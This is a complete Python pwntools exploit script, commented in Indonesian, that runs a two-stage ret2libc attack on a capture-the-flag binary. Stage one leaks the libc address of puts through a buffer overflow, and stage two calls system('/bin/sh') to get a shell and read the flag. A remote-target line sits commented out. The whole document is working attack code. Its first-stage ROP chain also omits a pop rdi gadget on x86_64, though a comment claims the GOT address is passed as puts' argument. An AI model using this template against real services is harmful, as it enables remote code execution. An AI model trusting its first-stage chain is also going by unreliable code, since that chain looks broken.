# Script exploit ret2libc lengkap dengan pwntools - leak libc lalu system("/bin/sh").
# Jalankan: python3 ret2libc.py

from pwn import *

# ===== Konfigurasi =====
context.binary = elf = ELF("./chall")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")   # GANTI dengan libc challenge!
io = process("./chall")
# io = remote("host.ctf.com", 1337)

offset = 72                                     # dari cyclic_find
pop_rdi = 0x4013b3                              # dari ROPgadget / pwntools

# ===== Stage 1: leak puts =====
print("[*] Stage 1: leak libc")

payload  = b"A" * offset
payload += p64(elf.plt.puts)       # panggil puts
payload += p64(elf.sym.main)       # kembali ke main
payload += p64(elf.got.puts)       # argumen: isi GOT puts = alamat puts di libc

io.sendlineafter(b": ", payload)
io.recvline()                      # buang baris "Halo ..."
leak = u64(io.recvline().strip().ljust(8, b"\x00"))
print(f"[+] puts @ {hex(leak)}")

# ===== Hitung base libc =====
libc.address = leak - libc.sym.puts
system = libc.sym.system
binsh  = next(libc.search(b"/bin/sh"))
print(f"[+] libc base @ {hex(libc.address)}")
print(f"[+] system    @ {hex(system)}")
print(f"[+] /bin/sh   @ {hex(binsh)}")

# ===== Stage 2: system("/bin/sh") =====
print("[*] Stage 2: RCE")

payload  = b"A" * offset
payload += p64(pop_rdi)
payload += p64(binsh)
payload += p64(system)

io.sendlineafter(b": ", payload)
io.sendline(b"cat flag.txt")       # atau io.interactive()
print(io.recvall())
